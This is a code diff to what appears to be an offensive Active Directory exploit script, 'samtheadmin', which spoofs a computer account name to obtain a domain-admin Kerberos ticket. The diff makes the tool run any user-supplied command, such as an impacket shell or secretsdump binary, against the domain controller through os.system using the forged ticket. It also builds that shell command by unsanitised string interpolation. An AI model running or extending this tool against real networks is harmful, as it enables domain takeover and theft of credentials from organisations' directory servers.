@@ -30,6 +30,8 @@ characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
 def samtheadmin(username, password, domain, options):
     if options.computer_name:
         new_computer_name = options.computer_name
+        if new_computer_name[-1] != "$":
+            new_computer_name = f'{new_computer_name}$'
     else:
         new_computer_name = f"SAMTHEADMIN-{random.randint(1,100)}$" 
     
@@ -126,12 +128,7 @@ def samtheadmin(username, password, domain, options):
 
     # will do something else later on 
     
-    if options.shell:
-        fbinary = "/usr/bin/impacket-smbexec"
-    elif options.dump:
-        fbinary = "/usr/bin/impacket-secretsdump"
-    else:
-        fbinary = '/bin/echo "Action not specified, exiting!"; #'
+    fbinary = options.cmd
 
     getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                    "
     os.system(getashell)
@@ -174,7 +171,7 @@ if __name__ == '__main__':
     parser.add_argument('-computer-name', action='store', required=False, help='Computer account to create within the domain')
     parser.add_argument('-computer-pass', action='store', required=False, help=('Password to use for the newly created computer'))
     parser.add_argument('-impersonate', action='store', required=False, help='Account to attempt to impersonate via S4U2Self')
-    parser.add_argument('-export', action='store_true', help='Save resulting ST in a file rather than dumping/popping a shell')
+    parser.add_argument('-cmd', action='store', required=True, help='Command to run (e.g., path to impacket binary, /home/username/.local/bin/secretsdump.py) ')
 
 
 
@@ -213,4 +210,3 @@ if __name__ == '__main__':
             import traceback
             traceback.print_exc()
         print(str(e))
-
